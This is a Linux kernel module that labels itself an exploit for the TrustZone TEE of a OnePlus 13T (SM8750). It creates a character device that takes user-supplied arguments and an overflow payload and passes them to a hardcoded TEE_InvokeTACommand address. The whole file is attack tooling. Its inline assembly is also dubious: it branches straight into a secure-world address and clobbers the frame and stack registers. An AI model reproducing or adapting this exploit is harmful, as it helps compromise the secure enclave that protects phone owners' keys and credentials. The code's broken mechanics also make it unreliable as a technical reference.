#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/cdev.h>
#include <linux/capability.h>
#include <asm/barrier.h>
#include <asm/unistd.h>

#define DEVICE_NAME "tz_tee_call"
#define DEV_MAJOR   240
#define DEV_MINOR   0

// OnePlus 13T SM8750 TEE_InvokeTACommand 真实地址（MCP确认）
#define TEE_INVOKE_CMD_ADDR 0xd842430c
// 适配MCP的最大Payload长度（0x1B8+0x318+8=0x4D8，留冗余到0x1000）
#define MAX_PAYLOAD_LEN     0x1000

static struct cdev tz_tee_cdev;
static dev_t tz_tee_dev;

// 核心修复：安全调用TEE函数（保护寄存器/栈）
static noinline uint64_t tee_invoke_command(uint64_t session_handle,
                                           uint64_t cmd_id,
                                           uint64_t param_types,
                                           uint64_t param_attrs,
                                           uint64_t params,
                                           uint64_t return_origin) {
    // 1. 地址合法性校验（ARM64 4字节对齐）
    if (TEE_INVOKE_CMD_ADDR == 0 || (TEE_INVOKE_CMD_ADDR & 0x3) != 0) {
        pr_err("TZ_TEE: 无效TEE地址 0x%llx\n", TEE_INVOKE_CMD_ADDR);
        return 0xFFFFFFFF;
    }

    // 2. 寄存器赋值（严格匹配TEE函数入参）
    register uint64_t x0 asm("x0") = session_handle;  // a1: 会话句柄
    register uint64_t x1 asm("x1") = cmd_id;          // a2: 命令ID
    register uint64_t x2 asm("x2") = param_types;     // a3: 参数类型
    register uint64_t x3 asm("x3") = param_attrs;     // a4: 参数属性
    register uint64_t x4 asm("x4") = params;          // a5: payload地址
    register uint64_t x5 asm("x5") = return_origin;   // a6: 返回原点
    register uint64_t lr asm("x30");                  // 保存返回地址

    uint64_t ret = 0xFFFFFFFF;

    // 3. 内联汇编调用（核心修复：保护栈/寄存器，避免TEE崩溃）
    asm volatile(
        "mov lr, #0\n"                      // 清空LR，避免干扰TEE
        "mov x29, sp\n"                     // 保存栈基址
        "blr %[tee_addr]\n"                 // 调用TEE_InvokeTACommand
        "mov sp, x29\n"                     // 恢复栈基址
        "mov %[ret], x0\n"                  // 保存返回值
        : [ret] "=r"(ret)
        : [tee_addr] "r"(TEE_INVOKE_CMD_ADDR),
          "r"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
        : "memory", "x6", "x7", "x8", "x9", "x10", "x11",
          "x12", "x13", "x14", "x15", "x16", "x17", "x18",
          "x19", "x20", "x21", "x22", "x23", "x24", "x25",
          "x26", "x27", "x28", "x29", "x30", "cpsr"
    );

    pr_info("TZ_TEE: TEE调用返回 0x%llx (cmd_id=0x%llx)\n", ret, cmd_id);
    return ret;
}

// 修复write函数：适配MCP的payload结构，增强稳定性
static ssize_t tz_tee_write(struct file *filp, const char __user *buf,
                           size_t len, loff_t *off) {
    uint64_t cmd_args[7];  // 入参：session/cmd/type/attr/params/return/len
    char *kernel_payload = NULL;
    size_t payload_len = 0;

    // 1. 权限校验（仅root可调用）
    if (!capable(CAP_SYS_ADMIN)) {
        pr_err("TZ_TEE: 无ROOT权限 (UID=%d)\n", current_uid().val);
        return -EPERM;
    }

    // 2. 长度校验（适配MCP的payload长度）
    if (len < sizeof(cmd_args) || len > MAX_PAYLOAD_LEN) {
        pr_err("TZ_TEE: 无效长度 %zu (范围: %zu ~ %zu)\n", 
               len, sizeof(cmd_args), MAX_PAYLOAD_LEN);
        return -EINVAL;
    }

    // 3. 拷贝用户参数（入参数组）
    if (copy_from_user(cmd_args, buf, sizeof(cmd_args))) {
        pr_err("TZ_TEE: 拷贝入参失败\n");
        return -EFAULT;
    }

    // 4. 拷贝payload（核心溢出数据）
    payload_len = len - sizeof(cmd_args);
    kernel_payload = kzalloc(payload_len, GFP_KERNEL | GFP_DMA);  // 适配TEE内存
    if (!kernel_payload) {
        pr_err("TZ_TEE: 分配内核内存失败\n");
        return -ENOMEM;
    }

    if (copy_from_user(kernel_payload, buf + sizeof(cmd_args), payload_len)) {
        pr_err("TZ_TEE: 拷贝payload失败\n");
        kfree(kernel_payload);
        return -EFAULT;
    }

    // 5. 打印调试信息（方便定位问题）
    pr_info("TZ_TEE: 开始调用TEE函数\n");
    pr_info("TZ_TEE: 会话=0x%llx, 命令ID=0x%llx, Payload长度=0x%zx\n",
            cmd_args[0], cmd_args[1], payload_len);
    pr_info("TZ_TEE: TEE函数地址=0x%llx\n", TEE_INVOKE_CMD_ADDR);

    // 6. 调用TEE函数（传递参数+payload地址）
    tee_invoke_command(
        cmd_args[0],  // session_handle (0x1)
        cmd_args[1],  // cmd_id (1109)
        cmd_args[2],  // param_types (0x0)
        cmd_args[3],  // param_attrs (0x0)
        (uint64_t)kernel_payload,  // payload地址
        cmd_args[5]   // return_origin (0x3)
    );

    // 7. 清理资源
    kfree(kernel_payload);
    return len;
}

// 文件操作结构体（补充release函数，避免资源泄漏）
static const struct file_operations tz_tee_fops = {
    .owner   = THIS_MODULE,
    .write   = tz_tee_write,
    .llseek  = no_llseek,
    .open    = nonseekable_open,
    .release = NULL,
};

// 模块初始化（增强错误处理）
static int __init tz_tee_init(void) {
    int ret = 0;

    // 校验TEE地址
    if (TEE_INVOKE_CMD_ADDR == 0) {
        pr_err("TZ_TEE: TEE函数地址未配置\n");
        return -EINVAL;
    }

    // 注册字符设备
    tz_tee_dev = MKDEV(DEV_MAJOR, DEV_MINOR);
    ret = register_chrdev_region(tz_tee_dev, 1, DEVICE_NAME);
    if (ret < 0) {
        pr_err("TZ_TEE: 注册设备号失败 (ret=%d)\n", ret);
        return ret;
    }

    // 初始化cdev
    cdev_init(&tz_tee_cdev, &tz_tee_fops);
    tz_tee_cdev.owner = THIS_MODULE;
    ret = cdev_add(&tz_tee_cdev, tz_tee_dev, 1);
    if (ret < 0) {
        pr_err("TZ_TEE: 添加设备失败 (ret=%d)\n", ret);
        unregister_chrdev_region(tz_tee_dev, 1);
        return ret;
    }

    pr_info("TZ_TEE: 模块加载成功！TEE地址=0x%llx\n", TEE_INVOKE_CMD_ADDR);
    pr_info("TZ_TEE: 设备节点: /dev/%s (主设备号=%d, 次设备号=%d)\n",
            DEVICE_NAME, DEV_MAJOR, DEV_MINOR);
    return 0;
}

// 模块卸载（完整清理）
static void __exit tz_tee_exit(void) {
    cdev_del(&tz_tee_cdev);
    unregister_chrdev_region(tz_tee_dev, 1);
    pr_info("TZ_TEE: 模块卸载成功\n");
}

module_init(tz_tee_init);
module_exit(tz_tee_exit);
MODULE_LICENSE("GPL");  // 必须GPL，否则内核拒绝加载
MODULE_DESCRIPTION("OnePlus 13T SM8750 TEE Exploit Module (适配0x1B8缓冲区)");
MODULE_VERSION("2.0");
